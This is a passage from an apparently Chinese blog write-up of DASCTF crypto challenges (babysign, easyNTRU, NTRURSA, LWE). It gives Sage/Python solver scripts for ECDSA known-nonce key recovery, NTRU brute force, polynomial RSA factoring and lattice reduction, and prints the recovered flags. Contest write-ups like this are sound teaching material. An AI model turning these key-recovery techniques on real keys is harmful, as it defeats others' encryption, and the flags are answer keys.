a:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line">    s=<span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rc4_main(key, s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#56e83694-f976-11eb-b343-faffc201c8e0</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/58932b5a14894eee9cf3d3737dc5e2e1.jpeg" alt="img"><img src="https://img-blog.csdnimg.cn/5f6a2fbba839404da1d8b0707669a50f.jpeg" alt="img"></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babysign"><a href="#babysign" class="headerlink" title="babysign"></a>babysign</h3><p>已知<code>r,s,nonce,msg,order</code>，<code>k = nonce</code>，<code>s = k^&#123;-1&#125; * (msg + r*secret)\% order</code></p>
<p>其中<code>order​</code>为固定值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">r = <span class="built_in">int</span>(<span class="string">&#x27;7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">s = <span class="built_in">int</span>(<span class="string">&#x27;a452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">nonce = <span class="number">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line">msg = <span class="string">b&#x27;welcome to ecdsa&#x27;</span></span><br><span class="line">msg = <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">gen = ecdsa.NIST256p.generator</span><br><span class="line">order = gen.order()</span><br><span class="line">secret = (s * nonce - msg) * inverse(r, order) % order</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;DASCTF&#123;&#x27;</span> + long_to_bytes(secret) + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;11b7311d4f0137074a7256d3eb82f368&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="easyNTRU"><a href="#easyNTRU" class="headerlink" title="easyNTRU"></a>easyNTRU</h3><p><code>n=10​</code>很小直接爆破<code>m</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA3_256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">c = <span class="string">b&#x27;\xb9W\x8c\x8b\x0cG\xde\x7fl\xf7\x03\xbb9m\x0c\xc4L\xfe\xe9Q\xad\xfd\xda!\x1a\xea@&#125;U\x9ay4\x8a\xe3y\xdf\xd5BV\xa7\x06\xf9\x08\x96=&quot;f\xc1\x1b\xd7\xdb\xc1j\x82F\x0b\x16\x06\xbcJMB\xc8\x80&#x27;</span></span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">t = [<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(t,repeat=<span class="number">10</span>):</span><br><span class="line">    m = <span class="built_in">list</span>(i)</span><br><span class="line">    m = R(m)</span><br><span class="line">    sha3 = SHA3_256.new()</span><br><span class="line">    sha3 = sha3.update(<span class="built_in">bytes</span>(<span class="built_in">str</span>(m).encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    key = sha3.digest()</span><br><span class="line">    cypher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    m = cypher.decrypt(c)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;b437acf4-aaf8-4f8f-ad84-5b1824f5af9c&#125;\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="NTRURSA"><a href="#NTRURSA" class="headerlink" title="NTRURSA"></a>NTRURSA</h3><p>先多项式RSA分解求<code>hint(h)​</code>，然后​<code>NTRU​</code>求<code>g1</code>，最后爆破<code>rang</code>求<code>g</code>，之后就是普通的<code>ras</code>。脚本网上都有，拿来用就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p= <span class="number">64621</span></span><br><span class="line">P = PolynomialRing(Zmod(p), name = <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = P.gen()</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">25081</span>*x^<span class="number">175</span> + <span class="number">8744</span>*x^<span class="number">174</span> + <span class="number">9823</span>*x^<span class="number">173</span> + <span class="number">9037</span>*x^<span class="number">172</span> + <span class="number">6343</span>*x^<span class="number">171</span> + <span class="number">42205</span>*x^<span class="number">170</span> + <span class="number">28573</span>*x^<span class="number">169</span> + <span class="number">55714</span>*x^<span class="number">168</span> + <span class="number">17287</span>*x^<span class="number">167</span> + <span class="number">11229</span>*x^<span class="number">166</span> + <span class="number">42630</span>*x^<span class="number">165</span> + <span class="number">64363</span>*x^<span class="number">164</span> + <span class="number">50759</span>*x^<span class="number">163</span> + <span class="number">3368</span>*x^<span class="number">162</span> + <span class="number">20900</span>*x^<span class="number">161</span> + <span class="number">55947</span>*x^<span class="number">160</span> + <span class="number">7082</span>*x^<span class="number">159</span> + <span class="number">23171</span>*x^<span class="number">158</span> + <span class="number">48510</span>*x^<span class="number">157</span> + <span class="number">20013</span>*x^<span class="number">156</span> + <span class="number">16798</span>*x^<span class="number">155</span> + <span class="number">60438</span>*x^<span class="number">154</span> + <span class="number">58779</span>*x^<span class="number">153</span> + <span class="number">9289</span>*x^<span class="number">152</span> + <span class="number">10623</span>*x^<span class="number">151</span> + <span class="number">1085</span>*x^<span class="number">150</span> + <span class="number">23473</span>*x^<span class="number">149</span> + <span class="number">13795</span>*x^<span class="number">148</span> + <span class="number">2071</span>*x^<span class="number">147</span> + <span class="number">31515</span>*x^<span class="number">146</span> + <span class="number">42832</span>*x^<span class="number">145</span> + <span class="number">38152</span>*x^<span class="number">144</span> + <span class="number">37559</span>*x^<span class="number">143</span> + <span class="number">47653</span>*x^<span class="number">142</span> + <span class="number">37371</span>*x^<span class="number">141</span> + <span class="number">39128</span>*x^<span class="number">140</span> + <span class="number">48750</span>*x^<span class="number">139</span> + <span class="number">16638</span>*x^<span class="number">138</span> + <span class="number">60320</span>*x^<span class="number">137</span> + <span class="number">56224</span>*x^<span class="number">136</span> + <span class="number">41870</span>*x^<span class="number">135</span> + <span class="number">63961</span>*x^<span class="number">134</span> + <span class="number">47574</span>*x^<span class="number">133</span> + <span class="number">63954</span>*x^<span class="number">132</span> + <span class="number">9668</span>*x^<span class="number">131</span> + <span class="number">62360</span>*x^<span class="number">130</span> + <span class="number">15244</span>*x^<span class="number">129</span> + <span class="number">20599</span>*x^<span class="number">128</span> + <span class="number">28704</span>*x^<span class="number">127</span> + <span class="number">26857</span>*x^<span class="number">126</span> + <span class="number">34885</span>*x^<span class="number">125</span> + <span class="number">33107</span>*x^<span class="number">124</span> + <span class="number">17693</span>*x^<span class="number">123</span> + <span class="number">52753</span>*x^<span class="number">122</span> + <span class="number">60744</span>*x^<span class="number">121</span> + <span class="number">21305</span>*x^<span class="number">120</span> + <span class="number">63785</span>*x^<span class="number">119</span> + <span class="number">54400</span>*x^<span class="number">118</span> + <span class="number">17812</span>*x^<span class="number">117</span> + <span class="number">64549</span>*x^<span class="number">116</span> + <span class="number">20035</span>*x^<span class="number">115</span> + <span class="number">37567</span>*x^<span class="number">114</span> + <span class="number">38607</span>*x^<span class="number">113</span> + <span class="number">32783</span>*x^<span class="number">112</span> + <span class="number">24385</span>*x^<span class="number">111</span> + <span class="number">5387</span>*x^<span class="number">110</span> + <span class="number">5134</span>*x^<span class="number">109</span> + <span class="number">45893</span>*x^<span class="number">108</span> + <span class="number">58307</span>*x^<span class="number">107</span> + <span class="number">33821</span>*x^<span class="number">106</span> + <span class="number">54902</span>*x^<span class="number">105</span> + <span class="number">14236</span>*x^<span class="number">104</span> + <span class="number">58044</span>*x^<span class="number">103</span> + <span class="number">41257</span>*x^<span class="number">102</span> + <span class="number">46881</span>*x^<span class="number">101</span> + <span class="number">42834</span>*x^<span class="number">100</span> + <span class="number">1693</span>*x^<span class="number">99</span> + <span class="number">46058</span>*x^<span class="number">98</span> + <span class="number">15636</span>*x^<span class="number">97</span> + <span class="number">27111</span>*x^<span class="number">96</span> + <span class="number">3158</span>*x^<span class="number">95</span> + <span class="number">41012</span>*x^<span class="number">94</span> + <span class="number">26028</span>*x^<span class="number">93</span> + <span class="number">3576</span>*x^<span class="number">92</span> + <span class="number">37958</span>*x^<span class="number">91</span> + <span class="number">33273</span>*x^<span class="number">90</span> + <span class="number">60228</span>*x^<span class="number">89</span> + <span class="number">41229</span>*x^<span class="number">88</span> + <span class="number">11232</span>*x^<span class="number">87</span> + <span class="number">12635</span>*x^<span class="number">86</span> + <span class="number">17942</span>*x^<span class="number">85</span> + <span class="number">4</span>*x^<span class="number">84</span> + <span class="number">25397</span>*x^<span class="number">83</span> + <span class="number">63526</span>*x^<span class="number">82</span> + <span class="number">54872</span>*x^<span class="number">81</span> + <span class="number">40318</span>*x^<span class="number">80</span> + <span class="number">37498</span>*x^<span class="number">79</span> + <span class="number">52182</span>*x^<span class="number">78</span> + <span class="number">48817</span>*x^<span class="number">77</span> + <span class="number">10763</span>*x^<span class="number">76</span> + <span class="number">46542</span>*x^<span class="number">75</span> + <span class="number">36060</span>*x^<span class="number">74</span> + <span class="number">49972</span>*x^<span class="number">73</span> + <span class="number">63603</span>*x^<span class="number">72</span> + <span class="number">46506</span>*x^<span class="number">71</span> + <span class="number">44788</span>*x^<span class="number">70</span> + <span class="number">44905</span>*x^<span class="number">69</span> + <span class="number">46112</span>*x^<span class="number">68</span> + <span class="number">5297</span>*x^<span class="number">67</span> + <span class="number">26440</span>*x^<span class="number">66</span> + <span class="number">28470</span>*x^<span class="number">65</span> + <span class="number">15525</span>*x^<span class="number">64</span> + <span class="number">11566</span>*x^<span class="number">63</span> + <span class="number">15781</span>*x^<span class="number">62</span> + <span class="number">36098</span>*x^<span class="number">61</span> + <span class="number">44402</span>*x^<span class="number">60</span> + <span class="number">55331</span>*x^<span class="number">59</span> + <span class="number">61583</span>*x^<span class="number">58</span> + <span class="number">16406</span>*x^<span class="number">57</span> + <span class="number">59089</span>*x^<span class="number">56</span> + <span class="number">53161</span>*x^<span class="number">55</span> + <span class="number">43695</span>*x^<span class="number">54</span> + <span class="number">49580</span>*x^<span class="number">53</span> + <span class="number">62685</span>*x^<span class="number">52</span> + <span class="number">31447</span>*x^<span class="number">51</span> + <span class="number">26755</span>*x^<span class="number">50</span> + <span class="number">14810</span>*x^<span class="number">49</span> + <span class="number">3281</span>*x^<span class="number">48</span> + <span class="number">27371</span>*x^<span class="number">47</span> + <span class="number">53392</span>*x^<span class="number">46</span> + <span class="number">2648</span>*x^<span class="number">45</span> + <span class="number">10095</span>*x^<span class="number">44</span> + <span class="number">25977</span>*x^<span class="number">43</span> + <span class="number">22912</span>*x^<span class="number">42</span> + <span class="number">41278</span>*x^<span class="number">41</span> + <span class="number">33236</span>*x^<span class="number">40</span> + <span class="number">57792</span>*x^<span class="number">39</span> + <span class="number">7169</span>*x^<span class="number">38</span> + <span class="number">29250</span>*x^<span class="number">37</span> + <span class="number">16906</span>*x^<span class="number">36</span> + <span class="number">4436</span>*x^<span class="number">35</span> + <span class="number">2729</span>*x^<span class="number">34</span> + <span class="number">29736</span>*x^<span class="number">33</span> + <span class="number">19383</span>*x^<span class="number">32</span> + <span class="number">11921</span>*x^<span class="number">31</span> + <span class="number">26075</span>*x^<span class="number">30</span> + <span class="number">54616</span>*x^<span class="number">29</span> + <span class="number">739</span>*x^<span class="number">28</span> + <span class="number">38509</span>*x^<span class="number">27</span> + <span class="number">19118</span>*x^<span class="number">26</span> + <span class="number">20062</span>*x^<span class="number">25</span> + <span class="number">21280</span>*x^<span class="number">24</span> + <span class="number">12594</span>*x^<span class="number">23</span> + <span class="number">14974</span>*x^<span class="number">22</span> + <span class="number">27795</span>*x^<span class="number">21</span> + <span class="number">54107</span>*x^<span class="number">20</span> + <span class="number">1890</span>*x^<span class="number">19</span> + <span class="number">13410</span>*x^<span class="number">18</span> + <span class="number">5381</span>*x^<span class="number">17</span> + <span class="number">19500</span>*x^<span class="number">16</span> + <span class="number">47481</span>*x^<span class="number">15</span> + <span class="number">58488</span>*x^<span class="number">14</span> + <span class="number">26433</span>*x^<span class="number">13</span> + <span class="number">37803</span>*x^<span class="number">12</span> + <span class="number">60232</span>*x^<span class="number">11</span> + <span class="number">34772</span>*x^<span class="number">10</span> + <span class="number">1505</span>*x^<span class="number">9</span> + <span class="number">63760</span>*x^<span class="number">8</span> + <span class="number">20890</span>*x^<span class="number">7</span> + <span class="number">41533</span>*x^<span class="number">6</span> + <span class="number">16130</span>*x^<span class="number">5</span> + <span class="number">29769</span>*x^<span class="number">4</span> + <span class="number">49142</span>*x^<span class="number">3</span> + <span class="number">64184</span>*x^<span class="number">2</span> + <span class="number">55443</span>*x + <span class="number">45925</span></span><br><span class="line">c = <span class="number">19921</span>*x^<span class="number">174</span> + <span class="number">49192</span>*x^<span class="number">173</span> + <span class="number">18894</span>*x^<span class="number">172</span> + <span class="number">61121</span>*x^<span class="number">171</span> + <span class="number">50271</span>*x^<span class="number">170</span> + <span class="number">11860</span>*x^<span class="number">169</span> + <span class="number">53128</span>*x^<span class="number">168</span> + <span class="number">38658</span>*x^<span class="number">167</span> + <span class="number">14191</span>*x^<span class="number">166</span> + <span class="number">9671</span>*x^<span class="number">165</span> + <span class="number">40879</span>*x^<span class="number">164</span> + <span class="number">15187</span>*x^<span class="number">163</span> + <span class="number">33523</span>*x^<span class="number">162</span> + <span class="number">62270</span>*x^<span class="number">161</span> + <span class="number">64211</span>*x^<span class="number">160</span> + <span class="number">54518</span>*x^<span class="number">159</span> + <span class="number">50446</span>*x^<span class="number">158</span> + <span class="number">2597</span>*x^<span class="number">157</span> + <span class="number">32216</span>*x^<span class="number">156</span> + <span class="number">10500</span>*x^<span class="number">155</span> + <span class="number">63276</span>*x^<span class="number">154</span> + <span class="number">27916</span>*x^<span class="number">153</span> + <span class="number">55316</span>*x^<span class="number">152</span> + <span class="number">30898</span>*x^<span class="number">151</span> + <span class="number">43706</span>*x^<span class="number">150</span> + <span class="number">5734</span>*x^<span class="number">149</span> + <span class="number">35616</span>*x^<span class="number">148</span> + <span class="number">14288</span>*x^<span class="number">147</span> + <span class="number">18282</span>*x^<span class="number">146</span> + <span class="number">22788</span>*x^<span class="number">145</span> + <span class="number">48188</span>*x^<span class="number">144</span> + <span class="number">34176</span>*x^<span class="number">143</span> + <span class="number">55952</span>*x^<span class="number">142</span> + <span class="number">9578</span>*x^<span class="number">141</span> + <span class="number">9177</span>*x^<span class="number">140</span> + <span class="number">22083</span>*x^<span class="number">139</span> + <span class="number">14586</span>*x^<span class="number">138</span> + <span class="number">9748</span>*x^<span class="number">137</span> + <span class="number">21118</span>*x^<span class="number">136</span> + <span class="number">155</span>*x^<span class="number">135</span> + <span class="number">64224</span>*x^<span class="number">134</span> + <span class="number">18193</span>*x^<span class="number">133</span> + <span class="number">33732</span>*x^<span class="number">132</span> + <span class="number">38135</span>*x^<span class="number">131</span> + <span class="number">51992</span>*x^<span class="number">130</span> + <span class="number">8203</span>*x^<span class="number">129</span> + <span class="number">8538</span>*x^<span class="number">128</span> + <span class="number">55203</span>*x^<span class="number">127</span> + <span class="number">5003</span>*x^<span class="number">126</span> + <span class="number">2009</span>*x^<span class="number">125</span> + <span class="number">45023</span>*x^<span class="number">124</span> + <span class="number">12311</span>*x^<span class="number">123</span> + <span class="number">21428</span>*x^<span class="number">122</span> + <span class="number">24110</span>*x^<span class="number">121</span> + <span class="number">43537</span>*x^<span class="number">120</span> + <span class="number">21885</span>*x^<span class="number">119</span> + <span class="number">50212</span>*x^<span class="number">118</span> + <span class="number">40445</span>*x^<span class="number">117</span> + <span class="number">17768</span>*x^<span class="number">116</span> + <span class="number">46616</span>*x^<span class="number">115</span> + <span class="number">4771</span>*x^<span class="number">114</span> + <span class="number">20903</span>*x^<span class="number">113</span> + <span class="number">47764</span>*x^<span class="number">112</span> + <span class="number">13056</span>*x^<span class="number">111</span> + <span class="number">50837</span>*x^<span class="number">110</span> + <span class="number">22313</span>*x^<span class="number">109</span> + <span class="number">39698</span>*x^<span class="number">108</span> + <span class="number">60377</span>*x^<span class="number">107</span> + <span class="number">59357</span>*x^<span class="number">106</span> + <span class="number">24051</span>*x^<span class="number">105</span> + <span class="number">5888</span>*x^<span class="number">104</span> + <span class="number">29414</span>*x^<span class="number">103</span> + <span class="number">31726</span>*x^<span class="number">102</span> + <span class="number">4906</span>*x^<span class="number">101</span> + <span class="number">23968</span>*x^<span class="number">100</span> + <span class="number">52360</span>*x^<span class="number">99</span> + <span class="number">58063</span>*x^<span class="number">98</span> + <span class="number">706</span>*x^<span class="number">97</span> + <span class="number">31420</span>*x^<span class="number">96</span> + <span class="number">62468</span>*x^<span class="number">95</span> + <span class="number">18557</span>*x^<span class="number">94</span> + <span class="number">1498</span>*x^<span class="number">93</span> + <span class="number">17590</span>*x^<span class="number">92</span> + <span class="number">62990</span>*x^<span class="number">91</span> + <span class="number">27200</span>*x^<span class="number">90</span> + <span class="number">7052</span>*x^<span class="number">89</span> + <span class="number">39117</span>*x^<span class="number">88</span> + <span class="number">46944</span>*x^<span class="number">87</span> + <span class="number">45535</span>*x^<span class="number">86</span> + <span class="number">28092</span>*x^<span class="number">85</span> + <span class="number">1981</span>*x^<span class="number">84</span> + <span class="number">4377</span>*x^<span class="number">83</span> + <span class="number">34419</span>*x^<span class="number">82</span> + <span class="number">33754</span>*x^<span class="number">81</span> + <span class="number">2640</span>*x^<span class="number">80</span> + <span class="number">44427</span>*x^<span class="number">79</span> + <span class="number">32179</span>*x^<span class="number">78</span> + <span class="number">57721</span>*x^<span class="number">77</span> + <span class="number">9444</span>*x^<span class="number">76</span> + <span class="number">49374</span>*x^<span class="number">75</span> + <span class="number">21288</span>*x^<span class="number">74</span> + <span class="number">44098</span>*x^<span class="number">73</span> + <span class="number">57744</span>*x^<span class="number">72</span> + <span class="number">63457</span>*x^<span class="number">71</span> + <span class="number">43300</span>*x^<span class="number">70</span> + <span class="number">1508</span>*x^<span class="number">69</span> + <span class="number">13775</span>*x^<span class="number">68</span> + <span class="number">23197</span>*x^<span class="number">67</span> + <span class="number">43070</span>*x^<span class="number">66</span> + <span class="number">20751</span>*x^<span class="number">65</span> + <span class="number">47479</span>*x^<span class="number">64</span> + <span class="number">18496</span>*x^<span class="number">63</span> + <span class="number">53392</span>*x^<span class="number">62</span> + <span class="number">10387</span>*x^<span class="number">61</span> + <span class="number">2317</span>*x^<span class="number">60</span> + <span class="number">57492</span>*x^<span class="number">59</span> + <span class="number">25441</span>*x^<span class="number">58</span> + <span class="number">52532</span>*x^<span class="number">57</span> + <span class="number">27150</span>*x^<span class="number">56</span> + <span class="number">33788</span>*x^<span class="number">55</span> + <span class="number">43371</span>*x^<span class="number">54</span> + <span class="number">30972</span>*x^<span class="number">53</span> + <span class="number">39583</span>*x^<span class="number">52</span> + <span class="number">36407</span>*x^<span class="number">51</span> + <span class="number">35564</span>*x^<span class="number">50</span> + <span class="number">44564</span>*x^<span class="number">49</span> + <span class="number">1505</span>*x^<span class="number">48</span> + <span class="number">47519</span>*x^<span class="number">47</span> + <span class="number">38695</span>*x^<span class="number">46</span> + <span class="number">43107</span>*x^<span class="number">45</span> + <span class="number">1676</span>*x^<span class="number">44</span> + <span class="number">42057</span>*x^<span class="number">43</span> + <span class="number">49879</span>*x^<span class="number">42</span> + <span class="number">29083</span>*x^<span class="number">41</span> + <span class="number">42241</span>*x^<span class="number">40</span> + <span class="number">8853</span>*x^<span class="number">39</span> + <span class="number">33546</span>*x^<span class="number">38</span> + <span class="number">48954</span>*x^<span class="number">37</span> + <span class="number">30352</span>*x^<span class="number">36</span> + <span class="number">62020</span>*x^<span class="number">35</span> + <span class="number">39864</span>*x^<span class="number">34</span> + <span class="number">9519</span>*x^<span class="number">33</span> + <span class="number">24828</span>*x^<span class="number">32</span> + <span class="number">34696</span>*x^<span class="number">31</span> + <span class="number">2387</span>*x^<span class="number">30</span> + <span class="number">27413</span>*x^<span class="number">29</span> + <span class="number">55829</span>*x^<span class="number">28</span> + <span class="number">40217</span>*x^<span class="number">27</span> + <span class="number">30205</span>*x^<span class="number">26</span> + <span class="number">42328</span>*x^<span class="number">25</span> + <span class="number">6210</span>*x^<span class="number">24</span> + <span class="number">52442</span>*x^<span class="number">23</span> + <span class="number">58495</span>*x^<span class="number">22</span> + <span class="number">2014</span>*x^<span class="number">21</span> + <span class="number">26452</span>*x^<span class="number">20</span> + <span class="number">33547</span>*x^<span class="number">19</span> + <span class="number">19840</span>*x^<span class="number">18</span> + <span class="number">5995</span>*x^<span class="number">17</span> + <span class="number">16850</span>*x^<span class="number">16</span> + <span class="number">37855</span>*x^<span class="number">15</span> + <span class="number">7221</span>*x^<span class="number">14</span> + <span class="number">32200</span>*x^<span class="number">13</span> + <span class="number">8121</span>*x^<span class="number">12</span> + <span class="number">23767</span>*x^<span class="number">11</span> + <span class="number">46563</span>*x^<span class="number">10</span> + <span class="number">51673</span>*x^<span class="number">9</span> + <span class="number">19372</span>*x^<span class="number">8</span> + <span class="number">4157</span>*x^<span class="number">7</span> + <span class="number">48421</span>*x^<span class="number">6</span> + <span class="number">41096</span>*x^<span class="number">5</span> + <span class="number">45735</span>*x^<span class="number">4</span> + <span class="number">53022</span>*x^<span class="number">3</span> + <span class="number">35475</span>*x^<span class="number">2</span> + <span class="number">47521</span>*x + <span class="number">27544</span></span><br><span class="line"><span class="comment">#分解N</span></span><br><span class="line">q1, q2 = n.factor()</span><br><span class="line">q1, q2 = q1[<span class="number">0</span>], q2[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#求φ，注意求法，</span></span><br><span class="line">phi = (p**q1.degree() - <span class="number">1</span>) * (p**q2.degree() - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> gcd(e, phi) == <span class="number">1</span></span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">h = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">77</span>):</span><br><span class="line">    h+=<span class="built_in">str</span>(m[i])</span><br><span class="line">h = <span class="built_in">int</span>(h)</span><br><span class="line">p = <span class="number">106472061241112922861460644342336453303928202010237284715354717630502168520267</span></span><br><span class="line">c = <span class="number">20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g1 = m.LLL()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">g1 = <span class="number">228679177303871981036829786447405151037</span></span><br><span class="line">n = <span class="number">31398174203566229210665534094126601315683074641013205440476552584312112883638278390105806127975406224783128340041129316782549009811196493319665336016690985557862367551545487842904828051293613836275987595871004601968935866634955528775536847402581734910742403788941725304146192149165731194199024154454952157531068881114411265538547462017207361362857</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">20</span>):</span><br><span class="line">    q = g1 ^^ i</span><br><span class="line">    <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">        p = n // q</span><br><span class="line">        phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(<span class="number">0x10001</span>,phi)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;P01yn0m141RS4_W17h_NTRU&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="LWE-复现"><a href="#LWE-复现" class="headerlink" title="LWE?(复现)"></a>LWE?(复现)</h3><p>LWE? GGH?用Babai的算法好像通吃？（198×200的矩阵LLL要一点点的时间）<br><code>b = x*A+b*Y+z*C+e</code>可以看成<code>b = secret*D+e</code>，即将<code>x,y,z;A,B,C</code>拼起来，酱紫看起来就像GGH的形式了;但转化一下行和列又能有<code>b&#39; = D&#39;*secret+e</code>，酱紫看来又好像是LWE了。</p>
<p>道理我不懂，脚本我会用</p>
<p>反正Babai算法和Nguyen’s Attack算法都可解</p>
<p><img src="https://img-blog.csdnimg.cn/b610fe4e07bb40b0ac67c01d6889b46e.png" alt="img"></p>
<p>DASCTF{dcf41556-c194-4c66-9092-059e0bf8b84e}</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 跑个半小时？</span></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"></span><br><span class="line">m = <span class="number">66</span></span><br><span class="line">n = <span class="number">200</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">2</span> ^ <span class="number">20</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line">C = []</span><br><span class="line">f.readline()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    x = f.readline().replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        x = x[<span class="number">0</span>] + x[<span class="number">2</span>:]</span><br><span class="line">    x = <span class="built_in">eval</span>(x)</span><br><span class="line">    A.append(x)</span><br><span class="line">f.readline()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    x = f.readline().replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        x = x[<span class="number">0</span>] + x[<span class="number">2</span>:]</span><br><span class="line">    x = <span class="built_in">eval</span>(x)</span><br><span class="line">    B.append(x)</span><br><span class="line">f.readline()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    x = f.readline().replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;  &#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>] == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        x = x[<span class="number">0</span>] + x[<span class="number">2</span>:]</span><br><span class="line">    x = <span class="built_in">eval</span>(x)</span><br><span class="line">    C.append(x)</span><br><span class="line">f.close()</span><br><span class="line">b = (</span><br><span class="line">-<span class="number">19786291</span>, -<span class="number">713104590</span>, <span class="number">79700973</span>, <span class="number">23261288</span>, <span class="number">203038164</span>, <span class="number">430352288</span>, <span class="number">147848301</span>, <span class="number">633183638</span>, <span class="number">188651439</span>, <span class="number">243206160</span>, -<span class="number">654830271</span>,</span><br><span class="line"><span class="number">335642059</span>, -<span class="number">100511588</span>, <span class="number">180023362</span>, <span class="number">130607831</span>, <span class="number">227597861</span>, <span class="number">188424473</span>, <span class="number">175518170</span>, -<span class="number">246987997</span>, <span class="number">180879649</span>, <span class="number">421934976</span>,</span><br><span class="line">-<span 